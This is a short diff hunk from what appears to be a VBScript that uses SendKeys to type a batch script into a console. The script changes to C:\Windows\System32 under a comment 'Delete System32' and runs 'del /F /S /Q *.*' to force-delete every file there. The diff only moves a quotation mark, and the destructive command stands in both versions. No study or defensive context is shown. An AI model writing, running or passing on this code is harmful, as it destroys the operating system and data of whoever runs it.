@@ -49,8 +49,8 @@ cd C:\Windows\System32
 REM Delete System32
 timeout /t 4 NOBREAK > nul
 @echo off
-del /F /S /Q *.*
-"
+del /F /S /Q *.* "
+
 WScript.Sleep 100
 
 WshShell.SendKeys "{ENTER}" 
